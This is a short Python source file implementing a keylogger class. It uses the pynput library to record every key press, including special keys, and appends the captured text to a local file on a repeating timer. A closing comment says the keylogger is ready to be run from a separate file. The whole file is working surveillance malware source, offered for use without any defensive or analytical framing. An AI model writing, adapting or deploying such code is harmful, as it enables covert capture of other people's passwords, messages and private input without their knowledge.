import pynput.keyboard
import threading

class Keylogger:
    def __init__(self, time_interval, filename="keylog.txt"):
        self.log = ""
        self.interval = time_interval
        self.filename = filename

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = f" [{str(key)}] "
        self.append_to_log(current_key)

    def report(self):
        with open(self.filename, "a") as file:
            file.write(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# you can now proceed to run the keylogger file "run_keylogger.py"